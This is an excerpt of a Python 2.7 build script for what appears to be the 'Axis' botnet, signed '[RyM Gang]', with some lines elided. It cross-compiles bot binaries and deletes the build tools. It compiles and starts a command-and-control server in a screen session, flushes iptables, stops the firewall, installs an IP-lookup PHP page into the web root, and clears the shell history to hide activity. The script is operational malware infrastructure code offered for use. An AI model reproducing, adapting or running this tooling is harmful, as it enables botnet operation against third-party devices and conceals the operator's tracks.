...
if len(sys.argv) < 5:
    print("\x1b[31m[SYNTAX ERROR]\r\n Usage: python2.7 %s [IP] [BINSPREFIX] [BOTPORT] [CNCPORT]\x1b[0m" % sys.argv[0])
    sys.exit()
...
raw_input(
    "\x1b[1;36m[+] When All Files Are Loaded, Press Enter to Start Building...")
...
for line in x:
    ...
    print line,
x.close()
run("chmod 777 *; python2.7 Axis.py fff " + hst + " " + prf +
    "; rm -rf AXB; rm -rf Axis.py; rm -rf cross-compiler-*")
...
# CNC
raw_input(
    "\x1b[1;36mPress Enter to Build CNC - Detach with CNTRL+A+D Afterwards...\x1b[0m")
old8 = "#define PORT "
new8 = "#define PORT " + cp + "\n"
...
for line in x:
    ...
    print line,
x.close()
run("chmod 777 *; gcc -o C2 Axis.c -pthread -w; rm -rf Axis.c AXHDRS; iptables -F; service iptables stop; screen -S Axis ./C2 " +
    bp + " 1; mv iplookup.php /var/www/html; service httpd restart; restorecon -r /var/www/html/; history -c")
...
print("\x1b[1;36m[\x1b[33m!\x1b[1;36m] To \x1b[33mReScreen \x1b[1;36mCNC: \x1b[33mscreen -S Axis ./C2 " +
      bp+" 1 \x1b[1;36m[\x1b[33m!\x1b[1;36m]")
print("\r\n            \x1b[1;36m[RyM Gang]\r\n\x1b[0m")
exit(1)
